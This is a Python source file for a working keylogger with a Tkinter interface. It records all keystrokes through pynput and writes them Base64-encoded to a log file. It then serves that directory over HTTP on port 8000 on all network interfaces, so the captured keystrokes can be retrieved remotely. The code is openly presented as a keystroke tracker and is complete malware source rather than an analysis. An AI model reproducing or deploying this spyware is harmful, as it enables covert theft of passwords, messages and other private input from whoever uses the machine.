import tkinter as tk
from tkinter import scrolledtext, ttk
from pynput.keyboard import Listener
from datetime import datetime
import time
import base64
import os
from threading import Thread
from http.server import SimpleHTTPRequestHandler, HTTPServer

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("900x600")
        self.root.configure(bg="#0D1117")  # Dark background
        self.log_file = "keylog_encoded.txt"  # Directly store Base64-encoded logs

        # Set DPI awareness (Windows only)
        try:
            from ctypes import windll
            windll.shcore.SetProcessDpiAwareness(1)
        except:
            pass

        # Modern title
        self.title_label = tk.Label(
            root, text="Keylogger", font=("Bahnschrift", 28, "bold"),
            fg="#C9D1D9", bg="#0D1117"
        )
        self.title_label.pack(pady=10)

        # Subtitle instruction
        self.subtitle_label = tk.Label(
            root, text="Track those keystrokes.",
            font=("Arial", 16), fg="#8B949E", bg="#0D1117"
        )
        self.subtitle_label.pack(pady=5)

        # Main frame to hold cards and log display
        self.main_frame = tk.Frame(root, bg="#0D1117")
        self.main_frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)

        # Card-like frame for the log display
        self.log_card = tk.Frame(self.main_frame, bg="#161B22", bd=0, relief='ridge')
        self.log_card.pack(side=tk.LEFT, padx=10, pady=10, fill=tk.BOTH, expand=True)

        # Scrollable text area for the keylogger output
        self.log_display = scrolledtext.ScrolledText(
            self.log_card, wrap=tk.WORD, font=("Consolas", 14),
            bg="#0D1117", fg="#C9D1D9", insertbackground='#58A6FF',
            borderwidth=0, relief='flat'
        )
        self.log_display.pack(padx=15, pady=15, fill=tk.BOTH, expand=True)

        # Card for buttons with a soft shadow effect
        self.button_card = tk.Frame(self.main_frame, bg="#161B22", bd=0, relief='ridge')
        self.button_card.pack(side=tk.RIGHT, padx=10, pady=10, fill=tk.Y)

        # Clear Log Button with modern styling
        self.clear_button = tk.Button(
            self.button_card, text="Clear Log", command=self.clearLog,
            font=("Arial", 16), bg="#238636", fg="white",
            activebackground="#2EA043", activeforeground="white",
            borderwidth=0, relief='flat', padx=10, pady=5
        )
        self.clear_button.pack(pady=20, padx=10, fill=tk.X)

        # Start the keylogger listener
        self.startKeylogger()
        self.word_stack = []
        self.latesttime = time.time()

        # Start HTTP server in a new thread
        Thread(target=self.startHttpServer, daemon=True).start()

    def wordStacker(self, key):
        key = str(key).replace("'", "")

        # Handle special keys except Backspace, Enter, and Space
        special_keys = {
            'Key.tab': ' [TAB] ',
            'Key.shift': ' [SHIFT] ',
            'Key.ctrl_l': ' [CTRL] ',
            'Key.ctrl_r': ' [CTRL] ',
            'Key.alt_l': ' [ALT] ',
            'Key.alt_r': ' [ALT] ',
            'Key.esc': ' [ESC] ',
            'Key.up': ' [UP] ',
            'Key.down': ' [DOWN] ',
            'Key.left': ' [LEFT] ',
            'Key.right': ' [RIGHT] '
        }

        if key in special_keys:
            self.enqueueIntoLog(special_keys[key])
        elif key == 'Key.backspace':
            try:
                self.word_stack.pop(-1)  # Handle backspace
            except IndexError:
                pass
        elif key == 'Key.space':
            self.enqueueIntoLog(''.join(self.word_stack) + ' ') 
            self.word_stack.clear()
        elif key == 'Key.enter':
            self.enqueueIntoLog(''.join(self.word_stack) + '\n[ENTER]\n')
            self.word_stack.clear()
        else:
            self.word_stack.append(key)

    def enqueueIntoLog(self, entry):
        """Add a new entry to the log display and save it to the Base64-encoded file."""
        current = time.time()
        if current - self.latesttime > 30:
            timestamp = datetime.now().strftime("\n%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp}\n{entry}"
        else:
            log_entry = entry

        self.log_display.insert(tk.END, log_entry)
        self.log_display.see(tk.END)
        self.latesttime = time.time()
        self.saveLog(log_entry)

    def saveLog(self, entry):
        """Append log entries as Base64-encoded data."""
        encoded_entry = base64.b64encode(entry.encode()).decode()
        with open(self.log_file, "a") as f:
            f.write(encoded_entry + "\n")

    def clearLog(self):
        """Clear the log display and the Base64-encoded file."""
        self.log_display.delete(1.0, tk.END)
        open(self.log_file, "w").close()  # Clear the encoded log file

#STARTS HERE
    def startKeylogger(self):
        """Start the keylogger listener."""
        self.listener = Listener(on_press=self.wordStacker)
        self.listener.start()

    def startHttpServer(self):
        """Host the directory on a local HTTP server."""
        server_address = ("", 8000)  # Host on localhost:8000
        httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
        print("Serving on http://0.0.0.0:8000")
        httpd.serve_forever()

    def onClose(self):
        """Stop the keylogger and close the GUI."""
        self.listener.stop()
        self.root.destroy()

# GUI initialization
root = tk.Tk()
app = KeyloggerGUI(root)

root.protocol("WM_DELETE_WINDOW", app.onClose)
root.mainloop()
